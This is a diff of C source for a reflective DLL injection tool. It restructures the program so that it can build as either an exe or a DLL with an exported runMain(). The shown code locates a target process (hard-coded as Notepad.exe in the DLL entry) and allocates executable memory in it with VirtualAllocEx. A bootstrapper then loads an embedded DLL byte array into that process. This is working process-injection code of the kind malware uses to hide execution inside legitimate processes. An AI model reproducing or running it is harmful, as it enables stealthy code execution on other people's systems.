@@ -34,6 +34,35 @@
 #include "dll_byte_array.h"
 #include "bootstrapper.h"
 
+// entry for DLL
+#ifdef BUILD_DLL
+
+// gcc -DBUILD_DLL -shared -o a.dll main.c bootstrapper.c
+__declspec(dllexport) void runMain() {
+    // using pre-baked data, making this malleable would be the 'next steps' if you wish to do so :)
+    char *process_name  = "Notepad.exe";
+    int res        = EXIT_FAILURE;
+    
+    res = launch_reflective_processes(process_name);
+}
+
+#endif
+
+
+// entry for when building as an exe
+// gcc main.c bootstrapper.c -o a.exe
+int main(int argc, char **argv) {
+
+    char *process_name  = argv[1];
+    char *dll_path      = argv[2];
+    int res        = EXIT_FAILURE;
+    
+    res = launch_reflective_processes(process_name);
+    
+    // gg :)
+    return res;
+}
+
 // finds and returns a handle to a process given its name
 HANDLE find_process_and_get_handle(char *process_name) {
       
@@ -79,10 +108,10 @@ HANDLE find_process_and_get_handle(char *process_name) {
     return process_handle;
 }
 
-int main(int argc, char **argv) {
-
-    char *process_name              = argv[1];
-    char *dll_path                  = argv[2];
+/**
+ * Main function to begin the reflective loading sequence 
+*/
+int launch_reflective_processes(char *process_name) {
 
     HANDLE target_process_handle    = INVALID_HANDLE_VALUE;
     LPVOID local_dll_base           = (LPVOID)dll_data; // DLL data
@@ -166,7 +195,7 @@ int main(int argc, char **argv) {
                                         // it uses this information from dll_info_struct to locate and interact with the DLL.
     dll_info.get_process_addr = GetProcAddress;
     dll_info.load_library_a_addr = LoadLibraryA;
-
+    
     // Allocating memory in the target process for the bootstrapping code.
     // This memory will host the custom code responsible for properly loading and aligning the DLL in the process's memory.
     bootstrap_memory_base = VirtualAllocEx(target_process_handle, NULL, bootstrap_code_size + sizeof(dll_info), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
@@ -189,7 +218,4 @@ int main(int argc, char **argv) {
         printf("[-] Failed to complete.\n");
         return EXIT_FAILURE;
     }
-
-    // gg :)
-    return EXIT_SUCCESS;
 }
